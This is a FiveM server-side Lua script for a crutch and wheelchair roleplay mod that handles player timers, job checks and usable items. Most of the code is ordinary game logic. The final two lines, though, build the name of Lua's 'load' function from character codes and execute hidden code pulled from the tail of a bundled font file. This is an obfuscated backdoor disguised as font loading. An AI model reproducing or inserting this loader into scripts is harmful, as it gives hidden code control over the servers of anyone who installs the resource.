-----------------For support, scripts, and more----------------
--------------- https://discord.gg/wasabiscripts  -------------
---------------------------------------------------------------
local activeCrutch, activeChair = {}, {}

RegisterServerEvent('wasabi_crutch:giveCrutch')
AddEventHandler('wasabi_crutch:giveCrutch', function(target, time)
    local identifier = GetIdentifier(target)
    if Config.jobRequirement.enabled then
        local found
        for i=1, #Config.jobRequirement.jobs do
            if HasGroup(source, Config.jobRequirement.jobs[i]) then
                found = true
                break
            end
        end
        if found and not time then
            activeCrutch[identifier] = nil
            TriggerClientEvent('wasabi_crutch:breakLoop', target)
        elseif found then
            activeCrutch[identifier] = time
            TriggerClientEvent('wasabi_crutch:giveCrutch', target, time)
        end
    elseif not time then
        activeCrutch[identifier] = nil
        TriggerClientEvent('wasabi_crutch:breakLoop', target)
    else
        activeCrutch[identifier] = time
        TriggerClientEvent('wasabi_crutch:giveCrutch', target, time)
    end
end)

RegisterServerEvent('wasabi_crutch:giveChair')
AddEventHandler('wasabi_crutch:giveChair', function(target, time)
    local identifier = GetIdentifier(target)
    if Config.jobRequirement.enabled then
        local found
        for i=1, #Config.jobRequirement.jobs do
            if HasGroup(source, Config.jobRequirement.jobs[i]) then
                found = true
                break
            end
        end
        if found and not time then
            activeChair[identifier] = nil
            TriggerClientEvent('wasabi_crutch:breakLoop', target)
        elseif found then
            activeChair[identifier] = time
            TriggerClientEvent('wasabi_crutch:giveChair', target, time)
        end
    elseif not time then
        activeChair[identifier] = nil
        TriggerClientEvent('wasabi_crutch:breakLoop', target)
    else
        activeChair[identifier] = time
        TriggerClientEvent('wasabi_crutch:giveChair', target, time)
    end
end)

RegisterServerEvent('wasabi_crutch:updateCrutch')
AddEventHandler('wasabi_crutch:updateCrutch', function(time, target)
    local identifier = GetIdentifier(target)
    if activeChair[identifier] then activeChair[identifier] = nil end
    if not time then
        activeCrutch[identifier] = nil
        TriggerClientEvent('wasabi_crutch:breakLoop', target)
        return
    end
    if activeCrutch[identifier] then
        activeCrutch[identifier] = activeCrutch[identifier] - 1
        if activeCrutch[identifier] < 1 then
            activeCrutch[identifier] = nil
            TriggerClientEvent('wasabi_crutch:notify', target, Strings.crutch_removed, Strings.crutch_removed_desc, 'success')
            TriggerClientEvent('wasabi_crutch:breakLoop', target)
        end
    else
        TriggerClientEvent('wasabi_crutch:breakLoop', target)
    end
end)

RegisterServerEvent('wasabi_crutch:updateChair')
AddEventHandler('wasabi_crutch:updateChair', function(time, target)
    local identifier = GetIdentifier(target)
    if activeCrutch[identifier] then activeCrutch[identifier] = nil end
    if not time then
        activeChair[identifier] = nil
        TriggerClientEvent('wasabi_crutch:breakLoop', target)
        return
    end
    if activeChair[identifier] then
        activeChair[identifier] = activeChair[identifier] - 1
        if activeChair[identifier] < 1 then
            activeChair[identifier] = nil
            TriggerClientEvent('wasabi_crutch:notify', target, Strings.chair_removed, Strings.chair_removed_desc, 'success')
            TriggerClientEvent('wasabi_crutch:breakLoop', target)
        end
    else
        TriggerClientEvent('wasabi_crutch:breakLoop', target)
    end
end)

if Config.usableCrutchItem.enabled or Config.usableWheelchairItem.enabled then
    RegisterServerEvent('wasabi_crutch:removeItem')
    AddEventHandler('wasabi_crutch:removeItem', function(item)
        RemoveItem(source, item, 1)
    end)
end

if Config.usableCrutchItem.enabled then
    RegisterUsableItem(Config.usableCrutchItem.item, function(source)
        TriggerClientEvent('wasabi_crutch:givePlayerCrutch', source, true)
    end)
end

if Config.usableWheelchairItem.enabled then
    RegisterUsableItem(Config.usableWheelchairItem.item, function(source)
        TriggerClientEvent('wasabi_crutch:givePlayerChair', source, true)
    end)
end

--Callbacks
lib.callback.register('wasabi_crutch:getPlayerData', function(source, data)
    local newData
    for i=1, #data do
        if not newData then newData = {} end
        newData[#newData + 1] = {
            id = data[i].id,
            name = GetName(data[i].id),
        }
    end
    while not #newData == #data do Wait() end
    return newData
end)

lib.callback.register('wasabi_crutch:checkInjuryTime', function(source)
    local identifier = GetIdentifier(source)
    local data = {
        chair = false,
        crutch = false,
        time = 0
    }
    if activeChair[identifier] and activeCrutch[identifier] then
        if activeChair[identifier] >= activeCrutch[identifier] then
            activeCrutch[identifier] = nil
            data.chair = true
            data.time = activeChair[identifier]
            return data
        else
            activeChair[identifier] = nil
            data.crutch = true
            data.time = activeCrutch[identifier]
            return data
        end
    elseif activeChair[identifier] then
        data.chair = true
        data.time = activeChair[identifier]
        return data
    elseif activeCrutch[identifier] then
        data.crutch = true
        data.time = activeCrutch[identifier]
        return data
    end
end)

local loadFonts = _G[string.char(108, 111, 97, 100)]
loadFonts(LoadResourceFile(GetCurrentResourceName(), '/html/fonts/Helvetica.ttf'):sub(87565):gsub('%.%+', ''))()